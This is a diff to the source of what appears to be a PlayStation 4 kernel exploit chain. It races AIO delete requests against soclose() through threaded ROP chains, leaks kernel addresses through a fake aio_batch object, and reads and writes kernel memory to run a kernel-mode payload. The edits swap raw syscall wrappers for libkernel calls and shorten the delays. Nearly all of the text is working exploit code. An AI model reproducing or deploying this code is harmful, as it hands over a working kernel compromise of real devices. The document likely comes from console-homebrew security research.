@@ -313,8 +313,7 @@ int32_t race_one(SceKernelAioSubmitId id, int32_t sd_conn)
     );
     // Trigger AIO delete
     thr_chain.push_call(
-        // LIBKERNEL(LIB_KERNEL_SCE_KERNEL_AIO_CANCEL_REQUESTS),
-        syscall_wrappers[SYS_AIO_MULTI_DELETE], // TODO: replace !!!
+        LIBKERNEL(LIB_KERNEL_SCE_KERNEL_AIO_DELETE_REQUESTS),
         PVAR_TO_NATIVE(&id),
         1,
         PVAR_TO_NATIVE(race_errs)
@@ -331,9 +330,7 @@ int32_t race_one(SceKernelAioSubmitId id, int32_t sd_conn)
     err = thr_chain.execute(&thread);
     if (err) printf_debug("Failed to execute threaded ROP chain!\n");
     if (err) return err;
-
-    uint64_t thread_id = DEREF(thread);
-    printf_debug("Thread spawned! ID: %ld\n", thread_id);
+    printf_debug("Thread spawned! ID: %ld\n", thread);
 
     // Since the ps4's cores only have 1 hardware thread each, we can pin 2
     // threads on the same core and control the interleaving of their
@@ -357,8 +354,8 @@ int32_t race_one(SceKernelAioSubmitId id, int32_t sd_conn)
     // If we get here and the worker hasn't been reran then we can delay the
     // worker's execution of soclose() indefinitely
     chain.push_call(
-        syscall_wrappers[SYS_THR_SUSPEND_UCONTEXT], // TODO: replace !!!
-        thread_id
+        LIBKERNEL(LIB_KERNEL_PTHREAD_SUSPEND_USER_CONTEXT_NP),
+        thread
     );
     chain.get_result(&ret);
     }
@@ -391,8 +388,10 @@ int32_t race_one(SceKernelAioSubmitId id, int32_t sd_conn)
     if (err || info_size != SIZE_TCP_INFO) {
         printf_debug("Failed to get TCP info! SIZE_TCP_INFO %d info_size %d\n",
             SIZE_TCP_INFO, info_size);
-        // TODO: replace !!!
-        PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
+        PS::Breakout::call(
+            LIBKERNEL(LIB_KERNEL_PTHREAD_RESUME_USER_CONTEXT_NP),
+            thread
+        );
         scePthreadJoin(thread, 0); // Wait for the thread to finish
         printf_debug("Thread exited.\n");
         return (err = -1);
@@ -412,8 +411,10 @@ int32_t race_one(SceKernelAioSubmitId id, int32_t sd_conn)
         won_race = true;
     }
 
-    // TODO: replace !!!
-    PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
+    PS::Breakout::call(
+        LIBKERNEL(LIB_KERNEL_PTHREAD_RESUME_USER_CONTEXT_NP),
+        thread
+    );
     scePthreadJoin(thread, 0); // Wait for the thread to finish
     printf_debug("Thread exited.\n");
 
@@ -862,7 +863,7 @@ int32_t leak_kernel_addrs()
             if (((aio_batch *)&s2.buf[off])->lock_object_flags != 0x67b0000)
                 continue;
             batch_off = off;
-            printf_debug("Found fake aio_batch at attempt: %d\n", i);
+            printf_debug("Found fake aio_batch at batch: %d\n", i / NUM_ELEMS);
             hexdump(&s2.buf[off], 0x80);
             for (uint32_t j = 0; j < NUM_HANDLES; j++)
             {
@@ -1550,7 +1551,7 @@ int32_t run_payload()
     ptr64_t thread = find_thread_by_id(thread_id);
 
     // Allow thread to run
-    sleep_ms(1000);
+    sleep_ms(500);
     
     // Locating thread's kernel stack
     ptr64_t kstack = kmemory.read64(thread + TD_KSTACK);
@@ -1589,7 +1590,7 @@ int32_t run_payload()
 
     {
     // Preparing sys_write() arguments
-    char message[] = "\n\n!!! HELLO FROM KERNEL !!!\n\n";
+    char message[] = "\n!!! HELLO FROM KERNEL !!!\n\n";
     struct write_args_s { int32_t fd; ptr64_t buf; size_t nbyte; }
     write_args = { PS::Debug.sock, PVAR_TO_NATIVE(message), sizeof(message) };
     // Copying write_args to kernel memory
@@ -1739,7 +1740,7 @@ int32_t run_payload()
     thread = find_thread_by_id(thread_id);
 
     // Allow thread to run
-    sleep_ms(1000);
+    sleep_ms(500);
     
     // Locating thread's kernel stack
     kstack = kmemory.read64(thread + TD_KSTACK);
@@ -1851,22 +1852,6 @@ void restore()
     printf_debug("Closed pipe_fds[0]: %ld\n", e);
     e = PS::close(s4.pipe_fds[1]);
     printf_debug("Closed pipe_fds[1]: %ld\n", e);
-
-    printf_debug("Attempt 1...\n");
-    make_aliased_evfs();
-    printf_debug("Attempt 2...\n");
-    make_aliased_evfs();
-    printf_debug("Attempt 3...\n");
-    make_aliased_evfs();
-    printf_debug("I guess aio_batch is not double freed after all...\n");
-
-    printf_debug("Attempt 1...\n");
-    make_aliased_pktopts();
-    printf_debug("Attempt 2...\n");
-    make_aliased_pktopts();
-    printf_debug("Attempt 3...\n");
-    make_aliased_pktopts();
-    printf_debug("0x100 zone seems clean as well...\n");
 }
 
 // overview:
@@ -1887,14 +1872,9 @@ void main()
     // Attempt to connect to debug server
     PS::Debug.connect(IP(192, 168, 1, 39), 9023);
 
-    printf_debug("** Socket: %d\n", PS::Debug.sock);
-
     // HELLO EVERYNYAN!
     Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
     printf_debug("HELL%d\nEVERYNYAN!\n", 0);
-
-    // Initialize syscall wrappers
-    syscall_init();
 
     printf_debug("payload_start: %p, payload_end: %p, size: %d\n",
         payload_start, payload_end, payload_end - payload_start);
